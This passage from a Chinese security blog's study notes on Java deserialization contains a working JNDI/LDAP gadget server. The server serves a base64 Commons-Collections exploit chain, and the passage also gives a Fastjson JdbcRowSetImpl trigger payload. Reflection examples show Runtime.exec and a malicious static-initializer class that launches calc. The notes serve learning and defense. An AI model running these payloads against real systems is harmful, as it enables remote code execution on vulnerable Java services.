class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.text.ParseException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://vps:8000/#ExportObject&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br><span class="hljs-comment">//            Payload1: 利用LDAP+Reference Factory</span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><br><span class="hljs-comment">//            Payload2: 返回序列化Gadget</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (ParseException exception) &#123;<br>                exception.printStackTrace();<br>            &#125;<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// lookup参数注入触发</span><br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);<br><br>        <span class="hljs-comment">// Fastjson反序列化JNDI注入Gadget触发</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考连接：</p><ol><li><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0</a></li><li><a href="https://xz.aliyun.com/t/12277?time__1311=GqGxRDcD9D2iqGN4mxU2Qfe4GKK7KtN3x">https://xz.aliyun.com/t/12277?time__1311&#x3D;GqGxRDcD9D2iqGN4mxU2Qfe4GKK7KtN3x</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jndi</tag>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>rmi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化之Java反射进阶</title>
    <link href="/2024/08/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E8%BF%9B%E9%98%B6/"/>
    <url>/2024/08/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<blockquote><p>该博客为参考学习笔记博客，仅为本人记录的笔记，所以欢迎大家去<code>Drunkbaby</code>师傅的博客中进行学习！<a href="https://drun1baby.top/">Drunkbaby’s Blog</a></p></blockquote><p>参考链接：<a href="https://drun1baby.top/2022/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-03-Java%E5%8F%8D%E5%B0%84%E8%BF%9B%E9%98%B6/">Java反序列化基础篇-03-Java反射进阶</a></p><h1 id="一、反射的进阶知识"><a href="#一、反射的进阶知识" class="headerlink" title="一、反射的进阶知识"></a>一、反射的进阶知识</h1><h2 id="1-1-关于Java的java-lang-Runtime类"><a href="#1-1-关于Java的java-lang-Runtime类" class="headerlink" title="1.1 关于Java的java.lang.Runtime类"></a>1.1 关于Java的<code>java.lang.Runtime</code>类</h2><p>前面我们对这个类进行了一些简单的介绍：</p><p>在Java编程中，<code>Runtime</code> 类提供了一种与Java应用程序的运行环境进行交互的方式。<code>Runtime</code> 类是一个单例类，它封装了应用程序运行时的环境，通过它，开发者可以访问JVM的某些底层特性和功能。以下是 <code>Runtime</code> 类的主要作用和功能：</p><ol><li><p>执行系统命令</p><p>可以使用 <code>exec</code> 方法来执行操作系统命令，这在需要与系统进程交互时非常有用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;notepad&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>内存管理</p></li><li><p>关闭JVM</p></li><li><p>添加JVM关闭钩子</p></li></ol><p>对于一些RCE来说，这个类就是用来执行命令的；所以在反序列化中大多数的利用都与该类有关，因为可以利用<code>exec</code>方法来执行系统命令；</p><h2 id="1-2-设置setAccessible-true-暴力访问权限"><a href="#1-2-设置setAccessible-true-暴力访问权限" class="headerlink" title="1.2 设置setAccessible(true)暴力访问权限"></a>1.2 设置setAccessible(true)暴力访问权限</h2><p>在一般情况下，我们使用反射机制不能对类的私有 <code>private</code> 字段进行操作，所以需要通过设置访问权限<code>setAccessible(true)</code>来绕过访问限制从而能够<strong>执行一些函数</strong>或者<strong>修改一些私有变量的值</strong>。</p><p>在此之前我们进行过一个弹计算器的实践，在那里我们就有利用过这个方法，从而能够调用私有的构造函数实现实例化对象；如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionRuntime.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/30 13:24</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionRuntime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor();<span class="hljs-comment">// 获取构造函数</span><br>        con.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">// 设置可访问该私有构造函数</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con.newInstance();<span class="hljs-comment">// 调用该私有构造函数创建对象</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mRuntime</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mExec</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">re</span> <span class="hljs-operator">=</span> mRuntime.invoke(o);<br>        mExec.invoke(re, <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-3-forName的两个重载方法"><a href="#1-3-forName的两个重载方法" class="headerlink" title="1.3 forName的两个重载方法"></a>1.3 forName的两个重载方法</h2><p>对于<code>Class.forName()</code>方法，有两个重载方法；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Java">forName(String className)<br>forName(String name, <span class="hljs-type">boolean</span> initialize, ClassLoader loader)<br></code></pre></td></tr></table></figure><ul><li>第一个参数表示类名</li><li>第二个参数表示是否初始化</li><li>第三个参数表示类加载器，即告诉Java虚拟机如何加载这个类，Java默认的ClassLoader就是根据类名来加载类， 这个类名是类完整路路径，如 <code>java.lang.Runtime</code></li></ul><p>因此，<code>forName(className)</code>等价于<code>forName(className, true, currentLoader)</code></p><h2 id="1-4-各种代码块执行顺序"><a href="#1-4-各种代码块执行顺序" class="headerlink" title="1.4 各种代码块执行顺序"></a>1.4 各种代码块执行顺序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.mango.reflectionDemo;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflectionDemo.FunctionSort.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/31 12:16</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionSort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Test</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;2&quot;</span>);<br>    &#125;<br>    Test()&#123;<br>        System.out.println(<span class="hljs-string">&quot;3&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407311218809.png" alt="image-20240731121800676"></p><p>根据运行的结果可以知道，首先调用的是<code>static&#123;&#125;</code>，其次是<code>&#123;&#125;</code>，最后才调用构造函数<code>Test()</code>。</p><p>其中，<code>static()</code>就是在“类初始化”的时候调用的，而<code>&#123;&#125;</code>中的代码回放在构造函数的<code>super()</code>后面，但在当前<code>构造函数</code>内容的前面。</p><p>所以说，<code>forName</code>中的<code>initialize=true</code>其实就是告诉Java虚拟机是否执行“类初始化”（是否执行<code>static()</code>中的内容）。</p><p>那么，假设我们有如下函数，其中函数的参数name可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ref</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>Class.forName(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>由于默认的<code>initialize</code>参数默认为<code>true</code>，我们即可编写一个恶意类，将恶意代码放置在<code>static()</code>中，使类默认初始化进而执行<code>static()</code>中的参数；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.maliciousClass;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.maliciousClass.returnCalc.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/8/2 13:41</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">returnCalc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.mango.reflectionDemo;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflectionDemo.staticReflection.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/8/2 13:42</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">staticReflection</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class.forName(<span class="hljs-string">&quot;com.mango.maliciousClass.returnCalc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二、Java命令执行的三种方式"><a href="#二、Java命令执行的三种方式" class="headerlink" title="二、Java命令执行的三种方式"></a>二、Java命令执行的三种方式</h1><p>反序列化当中需要入口类，需要链子，还需要一个<strong>命令执行</strong>的方法。</p><h2 id="2-1-调用-Runtime-类进行命令执行"><a href="#2-1-调用-Runtime-类进行命令执行" class="headerlink" title="2.1  调用 Runtime 类进行命令执行"></a>2.1  调用 Runtime 类进行命令执行</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.mango.maliciousClass;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.maliciousClass.runtimeCE.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/8/2 13:55</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">runtimeCE</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();<br>        <span 